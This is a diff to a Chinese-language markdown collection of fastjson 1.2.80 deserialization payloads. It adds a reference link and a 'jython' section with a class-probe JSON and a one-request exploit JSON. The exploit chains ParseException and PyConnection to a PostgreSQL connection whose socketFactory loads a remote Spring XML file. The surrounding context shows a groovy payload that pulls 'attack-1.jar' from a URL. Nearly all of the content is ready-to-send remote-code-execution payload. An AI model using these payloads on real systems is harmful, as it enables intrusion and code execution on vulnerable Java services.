@@ -8,6 +8,8 @@
 
 Ref：
 - [fastjson1.2.80 payload合集](https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qg)
+- https://y4er.com/posts/fastjson-1.2.80/
+
 
 
 ### 最简单也最可能达成的groovy
@@ -28,6 +30,42 @@ step2:
     "config":{
         "@type":"org.codehaus.groovy.control.CompilerConfiguration",
         "classpathList":"http://127.0.0.1:81/attack-1.jar"
+    }
+}
+```
+
+### jython（org.python.antlr.ParseException）
+探测：
+```json
+{"x":{"@type":"java.lang.Character"{"@type":"java.lang.Class","val":"org.python.antlr.ParseException"}}}
+```
+一个请求利用：
+```json
+{
+    "a":{
+    "@type":"java.lang.Exception",
+    "@type":"org.python.antlr.ParseException",
+    "type":{}
+    },
+    "b":{
+        "@type":"org.python.core.PyObject",
+        "@type":"com.ziclix.python.sql.PyConnection",
+        "connection":{
+            "@type":"org.postgresql.jdbc.PgConnection",
+            "hostSpecs":[
+                {
+                    "host":"127.0.0.1",
+                    "port":2333
+                }
+            ],
+            "user":"user",
+            "database":"test",
+            "info":{
+                "socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
+                "socketFactoryArg":"http://127.0.0.1:443/spring.xml"
+            },
+            "url":""
+        }
     }
 }
 ```
